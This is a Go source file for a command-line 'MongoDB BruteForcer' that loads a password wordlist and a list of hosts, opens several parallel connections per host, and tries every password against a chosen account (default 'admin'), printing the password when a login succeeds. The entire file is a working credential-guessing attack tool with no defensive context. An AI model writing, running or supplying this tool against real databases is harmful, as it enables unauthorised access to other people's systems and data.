package main

import (
	"flag"
	"fmt"
	"labix.org/v2/mgo"
	"bytes"
	"io/ioutil"
	"os"
)

var VERBOSE bool
var PASSFILE string
var HOSTNAMES string
var DB string
var USERNAME string
var THREADS int

var COUNT int
var TOTALWORDS int

func login(db *mgo.Database, user, pass []byte) bool {

	// XXX: Check to make sure DB is still valid?
	err := db.Login(string(user[:]), string(pass[:]))
	if err == nil {
		return true
	}
	return false
}

func loadPasswords(filename string) [][]byte {
	data, err := ioutil.ReadFile(filename)
	if err != nil {
		panic(err)
	}
	words := bytes.Split(data, []byte{'\n'})

	if VERBOSE {
		fmt.Println("Loaded password list! Total words:", len(words))
	}
	TOTALWORDS = len(words)
	return words
}

func loadHostnames(filename string) [][]byte {
	data, err := ioutil.ReadFile(filename)
	if err != nil {
		line := []byte("localhost:27017")
		return [][]byte{line}
	}
	hostnames := bytes.Split(data, []byte{'\n'})
	return hostnames
}

func sessionBuilder(hostname, dbName string) (*mgo.Session, *mgo.Database) {
	session, err := mgo.Dial(hostname)
	if err != nil {
		fmt.Println("Error building session")
		panic(err)
	}
	session.SetMode(mgo.Monotonic, true)
	db := session.DB(dbName)
	return session, db
}

func passwordProducer(filename string, passwordChan chan []byte) {
	passwords := loadPasswords(filename)
	for _, password := range passwords {
		passwordChan<- password
	}
}
 
func passwordConsumer(id int, hostname string, user []byte, passwordChan chan []byte) {
	session, db := sessionBuilder(hostname, DB)
	count := 0
	defer session.Close()

	for {
		password := <-passwordChan

		if VERBOSE {
			fmt.Printf("%d:\t%s, count: %d/%d, %s:%s\n", id, hostname, count, COUNT, user, password)
		}

		if login(db, user, password) {
			fmt.Printf("WE DID IT!\n")
			fmt.Printf("Password is %s:%s\n", user, password)
			os.Exit(0)
		}

		count++
		COUNT++
	}	
}

func main () {
	fmt.Println("-------- MongoDB BruteForcer -------")
	flag.BoolVar(&VERBOSE, "verbose", true, "display each attempt")
	flag.StringVar(&HOSTNAMES, "hostname", "hosts.hosts", "hostname containing MongoDB")
	flag.StringVar(&PASSFILE, "passfile", "pass.pass", "location of password file")
	flag.StringVar(&DB, "database", "admin", "name of database to use")
	flag.StringVar(&USERNAME, "username", "admin", "username to bruteforce")
	flag.IntVar(&THREADS, "threads", 4, "number of db connections to use per machine")
	flag.Parse()

	passwordChannel := make(chan []byte, 10 * THREADS)
	username := []byte(USERNAME)

	hostnames := loadHostnames(HOSTNAMES)
	threadIndex := 0
	for _, hostname := range hostnames {
		hostname := string(hostname)
		if hostname == "" {
			continue
		}
		for i := 0; i < THREADS; i++ {
			go passwordConsumer(threadIndex, hostname, username, passwordChannel)
			threadIndex++
		}
	}
	
	passwordProducer(PASSFILE, passwordChannel)
	
}